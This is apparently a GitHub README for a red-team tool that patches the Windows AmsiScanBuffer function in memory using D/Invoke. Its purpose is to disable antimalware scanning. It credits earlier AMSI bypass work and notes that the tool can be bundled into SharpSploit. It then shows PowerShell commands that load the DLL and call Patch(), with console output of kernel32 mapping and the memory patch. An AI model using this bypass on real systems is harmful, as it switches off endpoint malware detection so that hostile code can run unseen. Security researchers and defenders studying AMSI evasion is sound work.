# SyscallAmsiScanBufferBypass

AmsiScanBuffer Patch using D/Invoke.

Credit goes to [RastaMouses original work](https://github.com/rasta-mouse/AmsiScanBufferBypass).

I was just using [TheWovers D/Invoke](https://thewover.github.io/Dynamic-Invoke/) to port the `P/Invoke` functions to `D/Invoke`.

### C#

Can be compiled to a DLL and loaded via reflection, or included in a larger .NET Assembly (e.g. [SharpSploit](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Evasion/Amsi.cs)).

```
PS > PS C:\temp> add-type -Path .\SyscallBypass.dll
PS > [Patch.bySyscall]::Patch()

[>] Manually mapping kernel32.dll into current process memory

Successfully allocated memory!
Successfully wrote PE header
Successfully wrote section .text
Successfully wrote section .rdata
Successfully wrote section .data
Successfully wrote section .pdata
Successfully wrote section .rsrc
Successfully wrote section .reloc

[>] Module Base : 24AFF3D0000

[>] Process Handle : 7FFF8DC60000

[>] Patch address : 7FFF8DC62420

[+] NtProtectVirtualMemory success, going to patch it now!

[>] Patching at address : 7FFF8DC62420

[+] NtProtectVirtualMemory set back to oldprotect!
```


